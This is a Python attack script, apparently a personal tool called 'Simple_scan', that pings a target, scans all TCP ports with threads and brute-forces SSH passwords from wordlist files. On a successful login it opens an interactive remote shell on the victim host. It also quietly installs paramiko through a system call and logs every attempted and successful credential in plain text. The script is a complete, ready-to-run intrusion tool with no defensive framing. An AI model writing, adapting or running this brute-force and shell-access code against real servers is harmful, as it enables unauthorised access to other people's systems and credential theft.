from threading import Thread, Lock   #To handle Threads.
import os         # To run system commands
import socket         # To create a connection
try:
    os.system("pip install paramiko >nul 2>&1")
except Exception as e :
    pass
import paramiko              # To create a secure shell 
import select
import sys
import logging


open_ports = []  # Shared list to store open ports
lock = Lock()    # Lock to ensure thread-safe operations


# Configure logging
logging.basicConfig(
    filename='scan_results.log',  # File to save the logs
    level=logging.INFO,           # Log level (INFO means general messages)
    format='%(asctime)s - %(levelname)s - %(message)s'  # Log format: timestamp, level, message
)


def is_target_alive(ip):  # Sends a ping request to check if an host is alive.
    try:
        print("__________________________________________________")
        print(f"Pinging target: {target_ip}\n")
        result = os.system(f"ping -c 1 {ip}" if os.name != 'nt' else f"ping -n 1 {ip}")
        if result == 0:
            print(f"Target {ip} is online.")
            logging.info(f"Target {ip} is online.")  # Log online status
            return True
        else:
            print(f"Target {ip} is offline.")
            logging.info(f"Target {ip} is offline.")  # Log offline status
            return False
    except Exception as e:
        print(f"Error pinging target: {e}")
        logging.error(f"Error pinging target {ip}: {e}")  # Log error
        return False


def scan_port(ip, port):
    """
    Scans a single port on the given IP.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((ip, port))
        if result == 0:
            with lock:  # Thread-safe addition to the list
                open_ports.append(port)
    except Exception as e:
        print(f"Error scanning port {port}: {e}")
    finally:
        sock.close()


def scan_ports(ip):
    print("__________________________________________________")
    print("[+] Starting port scan with threads!")
    print("__________________________________________________")

    threads = []  # To keep track of all threads
    for port in range(1, 65535):  # Scanning ports from 1 to 65535
        thread = Thread(target=scan_port, args=(ip, port))  # Create a thread for each port
        threads.append(thread)
        thread.start()

        if len(threads) >= 100:
            for t in threads:
                t.join()
            threads = []

    for t in threads:
        t.join()

    print(f"[-] Open ports: {sorted(open_ports)}")
    logging.info(f"Open ports on {ip}: {sorted(open_ports)}")  # Log open ports
    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    return open_ports



def attempt_ssh_login(ip, username, password):
    print("")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, port=22, username=username, password=password)
        print(f"Success! Username: {username}, Password: {password}")
        logging.info(f"Successful SSH login: {ip} - Username: {username}, Password: {password}")  # Log successful login
        return ssh  # Return SSH session for further commands
    except paramiko.AuthenticationException:
        print("Authentication failed.")
        logging.warning(f"Authentication failed for {ip} - Username: {username}, Password: {password}")  # Log failed login
    except Exception as e:
        print(f"Connection failed: {e}")
        logging.error(f"Connection failed to {ip}: {e}")  # Log error
    return None


def brute_force_ssh(ip):
    # Prompt the user for file paths
    username_file = input("Enter the path to the username file: ")
    password_file = input("Enter the path to the password file: ")

    # Read usernames from the specified file
    try:
        with open(username_file, 'r') as uf:
            usernames = [line.strip() for line in uf if line.strip()]
    except FileNotFoundError:
        print("Username file not found.")
        return None, None, None

    # Read passwords from the specified file
    try:
        with open(password_file, 'r') as pf:
            passwords = [line.strip() for line in pf if line.strip()]
    except FileNotFoundError:
        print("Password file not found.")
        return None, None, None

    # Attempt each username-password combination
    for username in usernames:
        for password in passwords:
            print(f"[+] Trying Username: {username}, Password: {password}")
            ssh = attempt_ssh_login(ip, username, password)
            if ssh:
                return ssh, username, password

    print("[*] SSH brute force attempt failed with provided username and password files.")
    return None, None, None


def interactive_shell(ssh):
    chan = ssh.invoke_shell()
    print("Interactive terminal session opened. Type 'exit' to close.")

    # Use platform-specific handling for reading user input
    if os.name == 'nt':
        import msvcrt
        def get_char():
            if msvcrt.kbhit():
                return msvcrt.getch().decode()
            return None
    else:
        import tty, termios
        fd = sys.stdin.fileno()
        oldtty = termios.tcgetattr(fd)
        tty.setraw(fd)

        def get_char():
            if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                return sys.stdin.read(1)
            return None

    try:
        chan.settimeout(0.0)

        while True:
            if chan.recv_ready():
                sys.stdout.write(chan.recv(1024).decode())
                sys.stdout.flush()
            if chan.recv_stderr_ready():
                sys.stderr.write(chan.recv_stderr(1024).decode())
                sys.stderr.flush()
            if chan.exit_status_ready():
                break

            # Send keyboard input to the SSH channel
            char = get_char()
            if char:
                if char == "\x03":  # Exit on Ctrl+C
                    break
                chan.send(char)

    except Exception as e:
        print(f"Error in interactive shell: {e}")
    finally:
        if os.name != 'nt':
            termios.tcsetattr(fd, termios.TCSADRAIN, oldtty)
        chan.close()

def main(ip):
    if is_target_alive(ip):
        open_ports = scan_ports(ip)
        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        if 22 in open_ports:
            print("[+] Trying to connect via SSH.\n [-] Starting Brute Force...")
            ssh, username, password = brute_force_ssh(ip)
            if ssh:
                print(f"[+] Successful login with Username: {username}, Password: {password}")
                option = input("[-] Do you want to open an interactive shell? (y/n): ")
                if option.lower() == 'y':
                    interactive_shell(ssh)
                ssh.close()
            else:
                print("SSH brute force attempt failed.")
        else:
            print("Port 22 is closed.")
    else:
        print("Target is not reachable.")

if __name__ == "__main__":
    target_ip = input("Enter target IP: ")
    main(target_ip)
    print("Thank you for using Simple_scan we hope you enjoy it!")



"""This document was written by D.Y."""
